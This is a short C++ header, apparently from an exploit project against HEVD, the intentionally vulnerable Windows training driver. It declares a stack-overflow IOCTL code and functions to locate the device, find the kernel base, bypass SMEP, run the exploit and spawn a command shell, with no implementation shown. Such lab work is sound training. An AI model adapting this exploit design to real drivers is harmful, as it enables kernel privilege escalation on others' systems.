#pragma once

#include "pch.h"


class Hevd_StackOverflow
{
#define ARRAY_SIZE 1000
#define	HEVD_IOCTL_STACKOVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)

private : 
	HANDLE FindDevice(_In_ PCSTR DeviceName);
	static INT64 NtBaseAddress();
	static void BypassSmep(_In_ BYTE buffer[], _In_ INT64 offset[]);

public : 
	void HevdExploit(_In_ INT64 offset[]);
	void SpawnCmdShell();

};
